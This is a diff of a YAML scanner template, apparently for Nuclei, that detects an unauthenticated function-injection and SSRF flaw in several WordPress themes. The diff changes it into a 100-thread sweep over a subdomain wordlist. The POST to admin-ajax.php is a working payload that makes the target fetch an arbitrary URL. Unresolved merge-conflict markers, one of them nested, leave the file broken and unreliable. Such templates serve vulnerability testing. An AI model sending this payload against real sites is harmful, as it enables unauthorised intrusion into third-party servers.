@@ -1,10 +1,11 @@
 id: wp-multiple-theme-ssrf
 
 info:
-  name: WordPress Themes - Code Injection
+  name: WordPress Multiple Themes - Unauthenticated Function Injection
   author: madrobot
 <<<<<<< HEAD
   severity: high
+<<<<<<< HEAD
 =======
   severity: critical
 >>>>>>> 5d36d276 (add new stuff)
@@ -17,26 +18,35 @@ info:
     cvss-score: 9.8
     cwe-id: CWE-94
   tags: wordpress,rce,ssrf,edb,wpscan
+=======
+  tags: wordpress,rce,ssrf
+>>>>>>> 18ddf72b (add new stuff)
 
 requests:
-  - raw:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
       - |
         POST /wp-admin/admin-ajax.php?action=action_name HTTP/1.1
-        Host: {{Hostname}}
+        Host: {{Subdomains}}
+        Accept-Language: en
+        Accept-Encoding: gzip, deflate
         Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Content-Length: 158
+        Connection: close
 
-        action=epsilon_framework_ajax_action&args%5Baction%5D%5B%5D=Requests&args%5Baction%5D%5B%5D=request_multiple&args%5Bargs%5D%5B0%5D%5Burl%5D=http://interact.sh
-
+        action=epsilon_framework_ajax_action&args%5Baction%5D%5B%5D=Requests&args%5Baction%5D%5B%5D=request_multiple&args%5Bargs%5D%5B0%5D%5Burl%5D=http://example.com
     matchers-condition: and
     matchers:
       - type: word
-        part: body
         words:
-          - "Interactsh Server"
+          - "Example Domain"
           - "protocol_version"
+        part: body
 
       - type: status
         status:
           - 200
-
-# Enhanced by md on 2022/10/13
